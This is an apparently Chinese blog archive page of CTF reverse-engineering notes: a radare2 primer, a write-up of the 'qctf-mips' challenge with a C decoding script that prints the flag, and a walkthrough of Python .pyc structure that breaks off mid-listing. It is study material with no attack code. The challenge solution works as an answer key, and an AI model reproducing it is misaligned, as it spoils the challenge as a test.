<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/4/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-radare2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/radare2/" class="article-date">
  <time datetime="2019-07-28T17:11:01.757Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/二进制/">二进制</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/radare2/">CTF二进制总结0x02</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>ELF文件的动态调试，IDA远程动态调试GG，kali自带OD GG，edb-debug鸡肋的功能，来一发radare2好了。上午刚被gdb搞得头大，现在来挑战一下更难的r2。<br><br>首先，radare是一款类似于IDA的工具，他也有可视化图形界面，但是却是基于命令行之上的。先来一发Hello World调试一下。<br><br>gcc hello.c -o hello后，打开终端<br></p>
<blockquote>
<p>r2 ./hello<br><br>[0x00000530]&gt;</p>
</blockquote>
<p>变成了这个样子，这时输入ie，你会得到</p>
<blockquote>
<p>[Entrypoints]<br>vaddr=0x00000530 paddr=0x00000530 baddr=0x00000000 laddr=0x00000000 haddr=0x00000018 type=program<br><br><br>1 entrypoints</p>
</blockquote>
<p>这里的ie，即info entrypoints，在r2中，i?指令是很常用的，具体如下：<br></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[0x00000000]&gt; i?</span><br><span class="line">|Usage: i Get info from opened file (see rabin2&apos;s manpage)</span><br><span class="line">| Output mode:       </span><br><span class="line">| &apos;*&apos;                Output in radare commands</span><br><span class="line">| &apos;j&apos;                Output in json</span><br><span class="line">| &apos;q&apos;                Simple quiet output</span><br><span class="line">| Actions:           </span><br><span class="line">| i|ij               Show info of current file (in JSON)</span><br><span class="line">| iA                 List archs</span><br><span class="line">| ia                 Show all info (imports, exports, sections..)</span><br><span class="line">| ib                 Reload the current buffer for setting of the bin (use once only)</span><br><span class="line">| ic                 List classes, methods and fields</span><br><span class="line">| iC                 Show signature info (entitlements, ...)</span><br><span class="line">| id[?]              Debug information (source lines)</span><br><span class="line">| iD lang sym        demangle symbolname for given language</span><br><span class="line">| ie                 Entrypoint</span><br><span class="line">| iE                 Exports (global symbols)</span><br><span class="line">| ih                 Headers (alias for iH)</span><br><span class="line">| iHH                Verbose Headers in raw text</span><br><span class="line">| ii                 Imports</span><br><span class="line">| iI                 Binary info</span><br><span class="line">| ik [query]         Key-value database from RBinObject</span><br><span class="line">| il                 Libraries</span><br><span class="line">| iL [plugin]        List all RBin plugins loaded or plugin details</span><br><span class="line">| im                 Show info about predefined memory allocation</span><br><span class="line">| iM                 Show main address</span><br><span class="line">| io [file]          Load info from file (or last opened) use bin.baddr</span><br><span class="line">| ir                 Relocs</span><br><span class="line">| iR                 Resources</span><br><span class="line">| is                 Symbols</span><br><span class="line">| iS [entropy,sha1]  Sections (choose which hash algorithm to use)</span><br><span class="line">| iV                 Display file version info</span><br><span class="line">| iz|izj             Strings in data sections (in JSON/Base64)</span><br><span class="line">| izz                Search for Strings in the whole binary</span><br><span class="line">| iZ                 Guess size of binary program</span><br></pre></td></tr></table></figure>

<p>r2不会自动分析文件，刚开始用r2时…疯狂输入pdf，但是并没有什么效果啊，百度了一下才发现，需要analyse。这时可以输入aa或者aaa，其中aaa适合分析比较小的文件。这里选择了aaa。</p>
<blockquote>
<p>[0x00000530]&gt; aaa<br>[x] Analyze all flags starting with sym. and entry0 (aa)<br>[x] Analyze len bytes of instructions for references (aar)<br>[x] Analyze function calls (aac)<br>[ ] [*] Use -AA or aaaa to perform additional experimental analysis.<br>[x] Constructing a function name for fcn.* and sym.func.* functions (aan))</p>
</blockquote>
<p>在分析中，还可以用到s 0x00xxxxxx 用来跳到目标地址，还可以用px wx来进行修改汇编指令，还有汇编语言$ rasm2 -a x86 -b 64 “jmp 0x00xxx”转机器码。eval cfg.write=true 或 r2 -w hello来使文件可写，px 20 wx等操作来写入修改后的字节码。有时间做一道题目试试看吧。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/radare2/" data-id="cjyn83qep001iicthwib1q263" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-qctf-mips" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/qctf-mips/" class="article-date">
  <time datetime="2019-07-28T17:11:01.752Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/二进制/">二进制</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/qctf-mips/">qctf-mips</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><ul>
<li>分析代码,首先是第一个函数(简单异或,操作以后和一个长度为5的字符串作比较</li>
<li>比较通过后,进入下一个函数,再次处理后27字符,后发现函数根据i&amp;1的返回值分开了执行顺序,即奇偶分开加密</li>
<li>两端代码极其相似(一开始我弄没做出来,看了好久才发现= =)</li>
<li>实际上这两个操作是一个可逆的高低位互换(高二低六)</li>
<li>放出<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"ida.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">32</span>] = &#123;<span class="number">81</span>,<span class="number">124</span>,<span class="number">106</span>,<span class="number">123</span>,<span class="number">103</span>,<span class="number">82</span>, <span class="number">253</span>,  <span class="number">22</span>, <span class="number">164</span>, <span class="number">137</span>, <span class="number">189</span>, <span class="number">146</span>, <span class="number">128</span>,  <span class="number">19</span>,  <span class="number">65</span>, </span><br><span class="line">   <span class="number">84</span>, <span class="number">160</span>, <span class="number">141</span>,  <span class="number">69</span>,  <span class="number">24</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">252</span>, <span class="number">149</span>, <span class="number">240</span>, </span><br><span class="line">   <span class="number">22</span>, <span class="number">121</span>,  <span class="number">26</span>,  <span class="number">21</span>,  <span class="number">91</span>, <span class="number">117</span>,  <span class="number">31</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i,j,x,y;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">5</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((i&amp;<span class="number">1</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">            a[i] = ((a[i]&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0xff</span>)|((a[i]&gt;&gt;<span class="number">6</span>)&amp;<span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            a[i] = ((a[i]&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0xff</span>)|((a[i]&lt;&lt;<span class="number">6</span>)&amp;<span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        a[i]^=(<span class="number">32</span>-i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="mips总结"><a href="#mips总结" class="headerlink" title="mips总结"></a>mips总结</h2><ul>
<li>一般的mips最好还是对照着汇编耐心分析(这种需要硬怼汇编的题一定要有耐心啊,无论是这种还是vm,主要是分析稍微繁琐,但是思路都不会没有的</li>
<li>指令中类似于$v0, 0($v0)的,括号中为基址,外面的数字为偏移</li>
<li>lw &lt;=相反=&gt; sw</li>
<li>其余还要记住一些算法的特征常量</li>
<li>耐心怼还是最重要的</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/qctf-mips/" data-id="cjyn83qeo001gicthhwdnfndb" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-python_pyc" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/python_pyc/" class="article-date">
  <time datetime="2019-07-28T17:11:01.742Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/python_pyc/">Python的一些底层原理</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li><p>踩了太多次坑了,从前几个月的suctf开始,pyc文件逆向越来越多的出现在各种比赛中,正好借这个机会好好熟悉一下Python的底层</p>
<h1 id="Python的一些底层实现"><a href="#Python的一些底层实现" class="headerlink" title="Python的一些底层实现"></a>Python的一些底层实现</h1></li>
<li><p>python常常被当做是一门解释型语言,但是实际上,Python的底层和java等语言非常相近,都是一门基于虚拟机的语言,当用户在命令行输入python test.py时,实际上进行的是一个编译的过程</p>
</li>
<li><p>.pyc也就是Python编译好的文件,在一般情况下,编译出的字节码是存在于内存中的,当Python运行结束后,就会释放掉内存,或者写入.pyc文件,被我们看到,如果这个时候再次运行.py文件,python解释器会先在目录下中查找对应的.pyc文件,如果找到,则会直接运行,否则将会重新解释编译</p>
</li>
<li><p>.pyc文件生成的目的又是什么呢,我们可以将其理解成类似于linux中的.so库一样,是为了加快程序的运行速度,在一些调用模块较多的程序中,这样明显会提高程序的运行速度和占用内存空间.</p>
<h1 id="pyc文件解析"><a href="#pyc文件解析" class="headerlink" title="pyc文件解析"></a>pyc文件解析</h1></li>
<li><p>当我们在命令行输入 python -m filename.py的时候,便会得到一个对应的filename.pyc(-m 指令是作为模块运行,这时会生成pyc文件)</p>
</li>
<li><p>这时我们就可以配合着010editor解析该pyc文件了.</p>
</li>
<li><p>首先解析一个最简单的程序</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"helloworld!"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">    <span class="keyword">print</span> chr(ord(s[i]) + i)</span><br></pre></td></tr></table></figure>

<ul>
<li>python -m 1.py以后,我得到了一个1.pyc文件,内容如下</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00000000: 03 f3 0d 0a 8d 0e e3 5b 63 00 00 00 00 00 00 00  .......[c.......</span><br><span class="line">00000010: 00 05 00 00 00 40 00 00 00 73 40 00 00 00 64 00  .....@...s@...d.</span><br><span class="line">00000020: 00 5a 00 00 78 33 00 65 01 00 65 02 00 65 00 00  .Z..x3.e..e..e..</span><br><span class="line">00000030: 83 01 00 83 01 00 44 5d 1f 00 5a 03 00 65 04 00  ......D]..Z..e..</span><br><span class="line">00000040: 65 05 00 65 00 00 65 03 00 19 83 01 00 65 03 00  e..e..e......e..</span><br><span class="line">00000050: 17 83 01 00 47 48 71 19 00 57 64 01 00 53 28 02  ....GHq..Wd..S(.</span><br><span class="line">00000060: 00 00 00 73 0b 00 00 00 68 65 6c 6c 6f 77 6f 72  ...s....hellowor</span><br><span class="line">00000070: 6c 64 21 4e 28 06 00 00 00 74 01 00 00 00 73 74  ld!N(....t....st</span><br><span class="line">00000080: 05 00 00 00 72 61 6e 67 65 74 03 00 00 00 6c 65  ....ranget....le</span><br><span class="line">00000090: 6e 74 01 00 00 00 69 74 03 00 00 00 63 68 72 74  nt....it....chrt</span><br><span class="line">000000a0: 03 00 00 00 6f 72 64 28 00 00 00 00 28 00 00 00  ....ord(....(...</span><br><span class="line">000000b0: 00 28 00 00 00 00 73 04 00 00 00 31 2e 70 79 74  .(....s....1.pyt</span><br><span class="line">000000c0: 08 00 00 00 3c 6d 6f 64 75 6c 65 3e 01 00 00 00  ....&lt;module&gt;....</span><br><span class="line">000000d0: 73 04 00 00 00 06 01 19 01                       s........</span><br></pre></td></tr></table></figure>

<ul>
<li>pyc的整体就是前八个相对固定的字节再加上一个PyCodeObject</li>
<li>前八个字节是相对固定的,前四个字节为固定的03 f3 0d 0a,后面的四字节为时间戳,这里采用小端续排序,即0x5be30e8d</li>
<li>接下来的一个字节就是0x63,也就是99,PyCodeObject的标识符’c’</li>
<li>接下来的16个字节就分别为小端序的co_argument,co_nlocals,co_stacksize和co_flags,分别为参数个数,变量个数,所需栈空间,一些特殊信息标志flags(如下所示)</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_OPTIMIZED    0x0001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_NEWLOCALS    0x0002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_VARARGS  0x0004</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_VARKEYWORDS  0x0008</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_NESTED       0x0010</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_GENERATOR    0x0020</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_NOFREE       0x0040</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_FUTURE_DIVISION       0x2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_FUTURE_ABSOLUTE_IMPORT 0x4000 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_FUTURE_WITH_STATEMENT  0x8000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_FUTURE_PRINT_FUNCTION  0x10000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CO_FUTURE_UNICODE_LITERALS 0x20000</span></span><br></pre></td></tr></table></figure>

<ul>
<li>再往后就是一个co_code,是以一个string形式保存的opcode字节流,0x73即’s’后面四个字节就是小端序的0x40</li>
<li>加上便宜后的0x40个字节码以后,来到数据区域,下面是一个0x28即为’(‘,也就是一个元组类型,长度为后四字节小端序的0x2</li>
<li>后续为一个0x73,即’S’,长度为0xb的helloworld!字符串,随后是一个’N’,即None,</li>
<li>随后又是一个元组’(‘,长度为6,后面跟着的就是元组中的6个元素,第一个为长度为1的s,第二个为长度为5的range,以此类推</li>
<li>然后就是三个空元组,3个字符串,下面是python定义了的一些数据类型标识</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_NULL               <span class="meta-string">'0'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_NONE               <span class="meta-string">'N'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_FALSE              <span class="meta-string">'F'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_TRUE               <span class="meta-string">'T'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_STOPITER           <span class="meta-string">'S'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_ELLIPSIS           <span class="meta-string">'.'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_INT                <span class="meta-string">'i'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_INT64              <span class="meta-string">'I'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_FLOAT              <span class="meta-string">'f'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_BINARY_FLOAT       <span class="meta-string">'g'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_COMPLEX            <span class="meta-string">'x'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_BINARY_COMPLEX     <span class="meta-string">'y'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_LONG               <span class="meta-string">'l'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_STRING             <span class="meta-string">'s'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_INTERNED           <span class="meta-string">'t'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_STRINGREF          <span class="meta-string">'R'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_TUPLE              <span class="meta-string">'('</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_LIST               <span class="meta-string">'['</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_DICT               <span class="meta-string">'&#123;'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_CODE               <span class="meta-string">'c'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_UNICODE            <span class="meta-string">'u'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_UNKNOWN            <span class="meta-string">'?'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_SET                <span class="meta-string">'&lt;'</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TYPE_FROZENSET          <span class="meta-string">'&gt;'</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>接下来用一个pyc解析脚本解析一下pyc文件,得到如下结果</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">magic: 168686339</span><br><span class="line">mtime: 1541607053</span><br><span class="line">code obj: code(</span><br><span class="line">	argcount = 0</span><br><span class="line">	nlocals = 0</span><br><span class="line">	stacksize = 5</span><br><span class="line">	flags = 64</span><br><span class="line">	code = 0x6400005a0000783300650100650200650000830100830100445d1f005a0300650400650500650000650300198301006503001783010047487119005764010053</span><br><span class="line">	consts = (&apos;helloworld!&apos;, None)</span><br><span class="line">	names = (&apos;s&apos;, &apos;range&apos;, &apos;len&apos;, &apos;i&apos;, &apos;chr&apos;, &apos;ord&apos;)</span><br><span class="line">	varnames = ()</span><br><span class="line">	freevars = ()</span><br><span class="line">	cellvars = ()</span><br><span class="line">	filename = 1.py</span><br><span class="line">	name = &lt;module&gt;</span><br><span class="line">	firstlineno = 1</span><br><span class="line">	lnotab =</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>可以看出来哦,magic加上时间戳,之后是一个大的PyCodeObject,前四个四字节为一些标识,然后是opcode,之后是程序一个元组里面有两个常量,后面是另一个元组,内容为调用的一些函数,变量名等,在文件尾部是三个元组,同时还有文件名以及调用方式</li>
<li>下面我们来解析一下code字节码,这里利用python自带的dis模块来进行转换.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">      <span class="number">0</span> LOAD_CONST          <span class="number">0</span> (<span class="number">0</span>) <span class="comment"># 加载consts常量的第0个,也就是helloworld!</span></span><br><span class="line">      <span class="number">3</span> STORE_NAME          <span class="number">0</span> (<span class="number">0</span>) <span class="comment"># 将其存放在栈内</span></span><br><span class="line">      <span class="number">6</span> SETUP_LOOP         <span class="number">51</span> (to <span class="number">60</span>) <span class="comment"># 设置循环</span></span><br><span class="line">      <span class="number">9</span> LOAD_NAME           <span class="number">1</span> (<span class="number">1</span>) <span class="comment"># 加载name中的range到栈内</span></span><br><span class="line">     <span class="number">12</span> LOAD_NAME           <span class="number">2</span> (<span class="number">2</span>) <span class="comment"># 加载name中的len到栈内</span></span><br><span class="line">     <span class="number">15</span> LOAD_NAME           <span class="number">0</span> (<span class="number">0</span>) <span class="comment"># 加载name中的s,实际上上面三个调用就是range(len(s))到栈内</span></span><br><span class="line">     <span class="number">18</span> CALL_FUNCTION       <span class="number">1</span> <span class="comment">#调用len</span></span><br><span class="line">     <span class="number">21</span> CALL_FUNCTION       <span class="number">1</span> <span class="comment">#调用range</span></span><br><span class="line">     <span class="number">24</span> GET_ITER</span><br><span class="line">&gt;&gt;   <span class="number">25</span> FOR_ITER           <span class="number">31</span> (to <span class="number">59</span>)</span><br><span class="line">     <span class="number">28</span> STORE_NAME          <span class="number">3</span> (<span class="number">3</span>) <span class="comment"># i入栈</span></span><br><span class="line">     <span class="number">31</span> LOAD_NAME           <span class="number">4</span> (<span class="number">4</span>) <span class="comment"># 加载name中的chr</span></span><br><span class="line">     <span class="number">34</span> LOAD_NAME           <span class="number">5</span> (<span class="number">5</span>) <span class="comment"># 加载name中的ord</span></span><br><span class="line">     <span class="number">37</span> LOAD_NAME           <span class="number">0</span> (<span class="number">0</span>) <span class="comment"># 加载name中的s</span></span><br><span class="line">     <span class="number">40</span> LOAD_NAME           <span class="number">3</span> (<span class="number">3</span>) <span class="comment"># 加载name中的i</span></span><br><span class="line">     <span class="number">43</span> BINARY_SUBSCR</span><br><span class="line">     <span class="number">44</span> CALL_FUNCTION       <span class="number">1</span> <span class="comment">#调用ord</span></span><br><span class="line">     <span class="number">47</span> LOAD_NAME           <span class="number">3</span> (<span class="number">3</span>) <span class="comment"># 加载name中的i</span></span><br><span class="line">     <span class="number">50</span> BINARY_ADD                <span class="comment"># 加法</span></span><br><span class="line">     <span class="number">51</span> CALL_FUNCTION       <span class="number">1</span> <span class="comment">#调用chr</span></span><br><span class="line">     <span class="number">54</span> PRINT_ITEM                <span class="comment"># 打印字符加上回车</span></span><br><span class="line">     <span class="number">55</span> PRINT_NEWLINE</span><br><span class="line">     <span class="number">56</span> JUMP_ABSOLUTE      <span class="number">25</span></span><br><span class="line">&gt;&gt;   <span class="number">59</span> POP_BLOCK</span><br><span class="line">&gt;&gt;   <span class="number">60</span> LOAD_CONST          <span class="number">1</span> (<span class="number">1</span>) <span class="comment"># return NONE</span></span><br><span class="line">     <span class="number">63</span> RETURN_VALUE</span><br></pre></td></tr></table></figure>

<ul>
<li>当我将循环条件直接改成11以后,opcode变成了下面的样子</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>           <span class="number">0</span> LOAD_CONST               <span class="number">0</span> (<span class="string">'helloworld!'</span>)</span><br><span class="line">            <span class="number">3</span> STORE_NAME               <span class="number">0</span> (s)</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>           <span class="number">6</span> SETUP_LOOP              <span class="number">45</span> (to <span class="number">54</span>)</span><br><span class="line">            <span class="number">9</span> LOAD_NAME                <span class="number">1</span> (range)</span><br><span class="line">           <span class="number">12</span> LOAD_CONST               <span class="number">1</span> (<span class="number">11</span>)</span><br><span class="line">           <span class="number">15</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">           <span class="number">18</span> GET_ITER</span><br><span class="line">      &gt;&gt;   <span class="number">19</span> FOR_ITER                <span class="number">31</span> (to <span class="number">53</span>)</span><br><span class="line">           <span class="number">22</span> 